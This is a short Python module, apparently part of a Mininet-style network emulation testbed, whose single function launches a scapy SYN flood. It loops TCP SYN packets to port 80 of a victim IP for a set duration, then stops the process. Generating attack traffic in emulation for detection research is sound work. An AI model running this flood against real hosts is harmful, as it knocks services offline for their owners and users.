import time
import subprocess
import signal
import logging
from scapy.all import Ether, IP, TCP, sendp

# Configure logging for this module
attack_logger = logging.getLogger('attack_logger')

def run_attack(attacker_host, victim_ip, duration):
    attack_logger.info(f"Starting SYN Flood from {attacker_host.name} to {victim_ip} for {duration} seconds.")
    scapy_cmd = f"from scapy.all import *; sendp(Ether()/IP(dst='{victim_ip}')/TCP(dport=80, flags='S'), loop=1, inter=0.01, verbose=0, iface='{attacker_host.intfNames()[0]}')"
    process = attacker_host.popen(['python3', '-c', scapy_cmd])
    
    time.sleep(duration)
    try:
        process.send_signal(signal.SIGINT) # Attempt to stop Scapy processes gracefully
    except:
        process.terminate() # Fallback to terminate
    process.wait() # Wait for the process to terminate
    attack_logger.info(f"SYN Flood from {attacker_host.name} to {victim_ip} finished.")
    return process